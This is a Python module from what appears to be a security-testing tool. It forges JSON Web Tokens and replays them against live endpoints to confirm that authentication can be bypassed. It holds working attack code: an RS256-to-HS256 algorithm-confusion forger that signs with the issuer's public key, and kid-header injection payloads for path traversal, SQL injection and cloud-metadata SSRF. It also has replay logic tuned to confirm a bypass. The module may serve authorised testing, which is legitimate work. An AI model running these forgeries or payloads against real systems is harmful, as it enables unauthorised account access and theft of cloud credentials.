#!/usr/bin/env python3
"""jwt_kid_injection.py — JWKS-sourced key confusion, kid injection, live replay.

Extends hunt.py's run_jwt_audit() (which already runs jwt_tool for alg=none /
RS256->HS256 / wordlist cracking locally). What's missing: (1) iterating EVERY
key in a real JWKS keys[] array rather than a single guessed/cached key —
issuers commonly rotate and publish multiple active keys; (2) kid-header
injection (kid is a JOSE HEADER field, not a claim) for path-traversal/SQLi-
shaped verifier lookups; (3) a 3-way baseline-diff replay confirmation
(original-token vs unauthenticated vs forged-token response) rather than
"jwt_tool says the forge succeeded locally," which false-positives on any
public 200 endpoint and false-negatives on a 401 that still parsed the token.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
from dataclasses import dataclass

from cryptography.hazmat.primitives import serialization
from jwt.algorithms import RSAAlgorithm


def discover_jwks(client, issuer_base_url: str) -> list[dict]:
    """Fetch and return every key in a JWKS keys[] array from common
    .well-known paths. Returns [] (not an exception) when unavailable."""
    for path in (".well-known/jwks.json", ".well-known/openid-configuration/jwks.json"):
        url = issuer_base_url.rstrip("/") + "/" + path
        response = client.get(url)
        if response.status_code != 200:
            continue
        try:
            body = response.json()
        except Exception:
            continue
        keys = body.get("keys", [])
        if keys:
            return keys
    return []


def _decode_segment(segment: str) -> dict:
    padded = segment + "=" * (-len(segment) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def try_rs256_to_hs256(token: str, jwks_keys: list[dict]) -> str | None:
    """Classic algorithm-confusion: re-sign the token as HS256 using the RSA
    public key's PEM (SubjectPublicKeyInfo) serialization as the HMAC secret.
    Only attempted when the token's kid matches a key actually present in the
    discovered JWKS — trying a key that isn't even the right one produces a
    signature nobody would accept, which is not a meaningful test."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header = _decode_segment(parts[0])
    kid = header.get("kid")
    matching_key = next((k for k in jwks_keys if k.get("kid") == kid), None)
    if matching_key is None:
        return None

    forged_header = dict(header)
    forged_header["alg"] = "HS256"
    forged_header_b64 = _b64url(json.dumps(forged_header, separators=(",", ":")).encode())
    payload_b64 = parts[1]
    signing_input = f"{forged_header_b64}.{payload_b64}".encode()

    # The classic RS256->HS256 confusion attack relies on a verifier that
    # naively does `hmac.verify(token, key=public_key)` without checking that
    # the token's alg actually matches the algorithm it expects to use with
    # that key material. The "public_key" a real verifier holds in memory is
    # the RSA public key deserialized from the JWK and (almost always)
    # serialized/compared as PEM / SubjectPublicKeyInfo bytes — NOT the raw,
    # still-base64url-ENCODED `n` field text. Signing with the wrong bytes
    # produces a signature no real verifier would ever accept, silently
    # defeating the whole attack. So: build the real RSA public key from the
    # JWK (n, e, kty) and use its PEM/SubjectPublicKeyInfo serialization as
    # the HMAC secret.
    try:
        public_key = RSAAlgorithm.from_jwk(matching_key)
    except Exception:
        return None
    secret = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{forged_header_b64}.{payload_b64}.{_b64url(signature)}"


def build_kid_injection_candidates(token: str) -> list[str]:
    """kid-header injection candidates — only meaningful when the original kid
    LOOKS like a path/identifier a verifier might resolve dynamically (contains
    a slash or file-extension-like segment); a bare short kid like "key-1" is
    not a plausible dynamic-lookup target. Returns a list of candidate kid values
    that can be used to construct attack JWTs."""
    parts = token.split(".")
    if len(parts) != 3:
        return []
    header = _decode_segment(parts[0])
    original_kid = str(header.get("kid", ""))
    if "/" not in original_kid and "." not in original_kid:
        return []

    # Return the candidate kid values themselves, which the caller can use to
    # construct injection JWTs. These are the raw payloads that go into the
    # "kid" header field.
    candidates = [
        "../../../../dev/null",
        "' UNION SELECT 'AAAAAAAAAAAAAAAA'-- -",
        "http://169.254.169.254/latest/meta-data/",
    ]
    return candidates


@dataclass
class ReplayResult:
    confirmed: bool
    detail: str = ""


_ERROR_VALUE_MARKERS = ("error", "fail", "unauthorized", "denied")


def _looks_error_shaped(response) -> bool:
    """Lightweight heuristic (not a full schema check): does a 2xx response's
    JSON body look like an error envelope despite the success status code?
    Some backends route every request — auth-rejected or not — through a
    catch-all handler that always returns HTTP 200/201 wrapping either real
    data or an `{"error": ...}`-shaped payload. Without inspecting the body,
    a forged token that gets 200-with-an-error-body would be misreported as
    a confirmed forgery. Duck-types on `.json()` like the rest of this
    module; if the body can't be parsed as JSON or has no error-like markers,
    this returns False and the caller proceeds as before."""
    json_method = getattr(response, "json", None)
    if not callable(json_method):
        return False
    try:
        body = json_method()
    except Exception:
        return False
    if not isinstance(body, dict):
        return False
    if "error" in body or "errors" in body:
        return True
    for key in ("code", "status"):
        value = body.get(key)
        if isinstance(value, str) and any(marker in value.lower() for marker in _ERROR_VALUE_MARKERS):
            return True
    return False


def confirm_replay(client, endpoint: str, forged_token: str, original_token: str) -> ReplayResult:
    """3-way baseline diff: the forged token must produce a response that (a)
    differs from the unauthenticated baseline AND (b) matches the *shape* of an
    authenticated response, not just any 200. This avoids false-positiving on
    a public 200 endpoint and false-negatives on a 401-with-parsed-claims
    response.

    The UNAUTHENTICATED baseline itself must not already be a 2xx success —
    if unauthenticated requests already succeed, the endpoint plainly isn't
    meaningfully auth-gated in the first place, and no comparison against it
    can prove anything about the forged token (a numerically-different 2xx,
    e.g. unauth=200 vs forged=201, would otherwise slip through an exact
    status-code-equality check).

    Critically, the ORIGINAL token's response is only a trustworthy baseline
    if it is itself a genuine 2xx success — i.e. proof the original token
    really does authenticate. If the original token's request errors (4xx/5xx,
    e.g. a flaky endpoint, an expired original token, or an unrelated server
    error), that is not a successful-auth shape at all, and matching the
    forged response's status code to it proves nothing. Concretely: original
    500 + forged 500 must NOT be reported as "forged token accepted" — that
    was a real false-positive in an earlier version of this function, since
    two coincidental/unrelated 500s satisfied a naive status-code-equality
    check. So the forged token must independently land in the 2xx range
    (matching the successful-auth pattern the original demonstrated), not
    merely produce the same numeric status code as original.

    Finally, a 2xx status code alone is not sufficient: the forged response's
    body is sanity-checked for an error-shaped envelope (see
    `_looks_error_shaped`) so a forged token that gets HTTP 200 wrapping an
    `{"error": ...}` body is not mistaken for a confirmed forgery."""
    unauth = client.get(endpoint, headers={})
    original = client.get(endpoint, headers={"Authorization": f"Bearer {original_token}"})
    forged = client.get(endpoint, headers={"Authorization": f"Bearer {forged_token}"})

    if 200 <= unauth.status_code < 300:
        return ReplayResult(
            confirmed=False,
            detail="endpoint accepts unauthenticated requests — replay confirmation is not meaningful here",
        )
    if not (200 <= original.status_code < 300):
        return ReplayResult(
            confirmed=False,
            detail="original token baseline did not itself succeed (non-2xx) — no valid baseline to confirm against",
        )
    if forged.status_code == unauth.status_code:
        return ReplayResult(confirmed=False, detail="forged token response matches unauthenticated baseline")
    if not (200 <= forged.status_code < 300):
        return ReplayResult(confirmed=False, detail="forged token response status differs from original-token baseline")
    if _looks_error_shaped(forged):
        return ReplayResult(
            confirmed=False,
            detail="forged token response was 2xx but its body looks error-shaped — not a confirmed forgery",
        )
    return ReplayResult(confirmed=True, detail="forged token accepted with original-token-shaped response")


def confirm_replay_any(client, endpoints, forged_token: str, original_token: str,
                       cap: int = 15):
    """Replay a forged token against up to ``cap`` candidate authenticated
    endpoints; return ``(endpoint, detail)`` for the FIRST that confirms
    acceptance, else ``None``.

    friends full-tool review F7: confirm_replay was orphaned — hunt.py's JWT
    audit generated forged tokens but never replayed them, so a genuinely
    accepted RS256->HS256 / kid forgery produced no finding. This bounds the
    replay and FAILS CLOSED (an endpoint whose replay raises is skipped), so it
    can be wired into the audit without risking a hang or a fabricated finding —
    only confirm_replay's conservative 3-way baseline can confirm.
    """
    for endpoint in list(endpoints)[:cap]:
        try:
            res = confirm_replay(client, endpoint, forged_token, original_token)
        except Exception:
            continue
        if getattr(res, "confirmed", False):
            return endpoint, res.detail
    return None
